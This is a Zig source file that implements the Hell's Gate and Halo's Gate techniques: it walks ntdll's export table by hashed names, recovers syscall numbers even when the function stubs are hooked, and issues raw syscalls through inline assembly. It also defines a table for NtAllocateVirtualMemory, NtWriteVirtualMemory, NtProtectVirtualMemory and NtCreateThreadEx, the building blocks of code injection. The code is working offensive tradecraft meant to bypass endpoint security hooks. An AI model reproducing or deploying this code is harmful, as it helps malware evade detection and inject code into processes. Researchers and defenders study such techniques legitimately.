const std = @import("std");
const windows = std.os.windows;
const ntdll = @import("ntdll.zig");

comptime {
    asm (
        \\.data
        \\w_system_call: .long 0
        \\
        \\.text
        \\.globl hells_gate
        \\hells_gate:
        \\    movl $0, w_system_call(%rip)
        \\    movl %ecx, w_system_call(%rip)
        \\    ret
        \\
        \\.globl hell_descent
        \\hell_descent:
        \\    mov %rcx, %r10
        \\    movl w_system_call(%rip), %eax
        \\    syscall
        \\    ret    
    );
}

const DOWN: usize = 32;
const RANGE: usize = 255;

pub const ZCircuit = struct {
    nt_dll: ntdll.NtDll,

    pub fn init() ?ZCircuit {
        const nt_dll = ntdll.NtDll.init().?;
        return .{ .nt_dll = nt_dll };
    }

    pub fn getSysId(self: ZCircuit, func_name_hash: u32) ?u16 {
        const module_address = @intFromPtr(self.nt_dll.table_entry.DllBase);
        const pdw_address_of_functions = @as([*]u32, @ptrFromInt(module_address + self.nt_dll.export_directory.AddressOfFunctions));
        const pdw_address_of_names = @as([*]u32, @ptrFromInt(module_address + self.nt_dll.export_directory.AddressOfNames));
        const pdw_address_of_name_ordinales = @as([*]u16, @ptrFromInt(module_address + self.nt_dll.export_directory.AddressOfNameOrdinals));
        for (0..self.nt_dll.export_directory.NumberOfNames) |cx| {
            const function_address = @as([*]u8, @ptrFromInt(module_address + pdw_address_of_functions[pdw_address_of_name_ordinales[cx]]));
            const name_ptr: [*:0]const u8 = @ptrFromInt(module_address + pdw_address_of_names[cx]);
            if (hashName(name_ptr) == func_name_hash) {
                // Hell's Gate
                if (function_address[0] == 0x4c and
                    function_address[1] == 0x8b and
                    function_address[2] == 0xd1 and
                    function_address[3] == 0xb8 and
                    function_address[6] == 0x00 and
                    function_address[7] == 0x00)
                {
                    const low = function_address[4];
                    const high = function_address[5];
                    return (@as(u16, high) << 8) | low;
                }

                // search neighboring syscall if hooked
                if (function_address[0] == 0xe9 or function_address[3] == 0xe9) {
                    for (1..RANGE) |i| {
                        const down_addr = function_address + i * DOWN;
                        if (down_addr[0] == 0x4c and
                            down_addr[1] == 0x8b and
                            down_addr[2] == 0xd1 and
                            down_addr[3] == 0xb8 and
                            down_addr[6] == 0x00 and
                            down_addr[7] == 0x00)
                        {
                            const low = down_addr[4];
                            const high = down_addr[5];
                            return ((@as(u16, high) << 8) | low) - @as(u16, @intCast(i));
                        }
                        const up_addr = function_address - (i * DOWN);
                        if (up_addr[0] == 0x4c and
                            up_addr[1] == 0x8b and
                            up_addr[2] == 0xd1 and
                            up_addr[3] == 0xb8 and
                            up_addr[6] == 0x00 and
                            up_addr[7] == 0x00)
                        {
                            const low = up_addr[4];
                            const high = up_addr[5];
                            return ((@as(u16, high) << 8) | low) + @as(u16, @intCast(i));
                        }
                    }
                }
            }
        }
        return null;
    }
};

pub inline fn hashName(name: [*:0]const u8) u32 {
    var h: u32 = 5381;
    var i: usize = 0;
    while (name[i] != 0) : (i += 1) {
        h = (h << 5) +% h +% @as(u32, name[i]);
    }
    return h;
}

pub fn syscall(callid: u16, args: anytype) u32 {
    const ArgsType = @TypeOf(args);
    const args_info = @typeInfo(ArgsType);

    if (args_info != .@"struct" or !args_info.@"struct".is_tuple) {
        @compileError("Expected a tuple of arguments, e.g., .{arg1, arg2}");
    }

    if (args.len > 11) @compileError("Too many arguments for this syscall implementation");

    hells_gate(callid);
    return hell_descent(
        if (args.len > 0) argToUsize(args[0]) else 0,
        if (args.len > 1) argToUsize(args[1]) else 0,
        if (args.len > 2) argToUsize(args[2]) else 0,
        if (args.len > 3) argToUsize(args[3]) else 0,
        if (args.len > 4) argToUsize(args[4]) else 0,
        if (args.len > 5) argToUsize(args[5]) else 0,
        if (args.len > 6) argToUsize(args[6]) else 0,
        if (args.len > 7) argToUsize(args[7]) else 0,
        if (args.len > 8) argToUsize(args[8]) else 0,
        if (args.len > 9) argToUsize(args[9]) else 0,
        if (args.len > 10) argToUsize(args[10]) else 0,
    );
}

fn argToUsize(arg: anytype) usize {
    const T = @TypeOf(arg);
    const type_info = @typeInfo(T);

    return switch (type_info) {
        .pointer => @intFromPtr(arg),
        .int => @intCast(arg),
        else => @as(usize, arg),
    };
}
extern fn hells_gate(syscall_number: u32) void;
extern fn hell_descent(arg1: usize, arg2: usize, arg3: usize, arg4: usize, arg5: usize, arg6: usize, arg7: usize, arg8: usize, arg9: usize, arg10: usize, arg11: usize) callconv(.c) u32;

pub const HANDLE = windows.HANDLE;
pub const PVOID = windows.PVOID;
pub const LPVOID = windows.LPVOID;
pub const NTSTATUS = windows.NTSTATUS;
pub const LIST_ENTRY = windows.LIST_ENTRY;
pub const UNICODE_STRING = windows.UNICODE_STRING;
pub const PEB_LDR_DATA = windows.PEB_LDR_DATA;
pub const PEB = windows.PEB;
pub const TEB = windows.TEB;
pub const LDR_DATA_TABLE_ENTRY = windows.LDR_DATA_TABLE_ENTRY;

pub const VxTableEntry = extern struct {
    address: ?PVOID,
    dw_hash: u64,
    system_call: u16,
};

pub const VxTable = extern struct {
    NtAllocateVirtualMemory: VxTableEntry,
    NtWriteVirtualMemory: VxTableEntry,
    NtProtectVirtualMemory: VxTableEntry,
    NtCreateThreadEx: VxTableEntry,

    pub fn init() VxTable {
        return VxTable{
            .NtAllocateVirtualMemory = VxTableEntry{
                .address = @ptrFromInt(0),
                .dw_hash = 0x2D6D94ABE5CBF5F6,
                .system_call = 0,
            },
            .NtCreateThreadEx = VxTableEntry{
                .address = @ptrFromInt(0),
                .dw_hash = 0xF5E50822A1E6CA7C,
                .system_call = 0,
            },
            .NtProtectVirtualMemory = VxTableEntry{
                .address = @ptrFromInt(0),
                .dw_hash = 0x68340BF4DD70E832,
                .system_call = 0,
            },
            .NtWriteVirtualMemory = VxTableEntry{
                .address = @ptrFromInt(0),
                .dw_hash = 0xD6BC9C637D9E5F1A,
                .system_call = 0,
            },
        };
    }
};
